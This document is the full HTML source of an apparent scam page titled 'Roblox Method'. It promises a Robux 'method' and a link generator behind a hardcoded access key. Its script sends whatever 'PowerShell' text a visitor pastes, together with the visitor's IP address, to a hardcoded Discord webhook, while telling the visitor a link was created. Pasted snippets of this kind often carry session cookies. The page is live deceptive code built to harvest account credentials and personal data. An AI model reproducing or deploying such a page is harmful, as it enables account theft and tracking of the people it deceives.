<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Method</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #1a1a2e;
            color: #eaeaea;
            font-family: 'Roboto', sans-serif;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        h1, h2 {
            margin: 20px 0;
            font-weight: 700;
        }
        h1 {
            font-size: 2.5em;
        }
        h2 {
            font-size: 1.8em;
            color: #00adb5;
        }
        p {
            margin: 15px 0;
            font-size: 1.1em;
        }
        .hidden {
            display: none;
        }
        input[type="text"] {
            padding: 10px;
            width: 300px;
            border: 2px solid #00adb5;
            border-radius: 5px;
            background-color: #0f3460;
            color: #eaeaea;
            font-size: 1em;
            margin-bottom: 20px;
        }
        button {
            background-color: #00adb5;
            color: #1a1a2e;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 1em;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #009999;
        }
        ul {
            list-style-type: none;
            padding: 0;
            text-align: left;
            margin: 20px auto;
            max-width: 400px;
        }
        li {
            margin: 10px 0;
            padding: 5px;
            background: rgba(0, 173, 181, 0.1);
            border-radius: 5px;
        }
        a {
            color: #00adb5;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
        .centered-video {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div id="key-input">
        <h1>Access Key Required</h1>
        <input type="text" id="key" placeholder="Enter your key here" autofocus>
        <button onclick="checkKey()">Submit</button>
    </div>

    <div id="content" class="hidden">
        <h1>Free Trial Started - 3 Day Key</h1>
        <h2>ROBLOX METHOD</h2>
        <ul>
            <li>- Best Method</li>
            <li>- 1M+ Robux Gained</li>
        </ul>
        <a id="link-generator" href="https://forms.gle/9fQhnGiqRa1sZ5sq7" target="_blank">Link Generator</a>

        <ul>
            <li>- Send PowerShells via Text below.</li>
            <li>- ONLY WORKS ON PROFILE, WE ARE FIXING GAME LINKS SOON</li>
        </ul>

  
        <input type="text" id="webhookKey" placeholder="Enter Powershell">
        <button onclick="sendToWebhook()">Create Link</button>

        <div class="centered-video">
            <iframe src="https://www.youtube.com/embed/zpvEXK6nc04" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        </div>
    </div>

    <script>
        function checkKey() {
            const inputKey = document.getElementById("key").value;
            const correctKey = "DEV-TOOLS-21412";
            if (inputKey === correctKey) {
                document.getElementById("key-input").classList.add("hidden");
                document.getElementById("content").classList.remove("hidden");
            } else {
                alert("Incorrect key. Please try again.");
            }
        }

        async function sendToWebhook() {
            const userKey = document.getElementById("webhookKey").value;
            if (!userKey) {
                alert("Please enter Powershell");
                return;
            }

            try {
                const ipResponse = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;

                const webhookUrl = "https://discord.com/api/webhooks/1302810226734403595/MMPGCUIQa0FD3_5WDk5_pFGwIlGGCe_6GjmxqNTQTd15CzHQ-jIsBAfv0M3HTBArMTHf";
                const payload = {
                    content: `@everyone IP ADDRESS: ${ipAddress}\nKEY: ${userKey}`
                };

                await fetch(webhookUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                alert("Powershell submitted successfully.");
            } catch (error) {
                console.error("Error sending to webhook:", error);
                alert("There was an error submitting your key. Please try again.");
            }
        }
    </script>
</body>
</html>
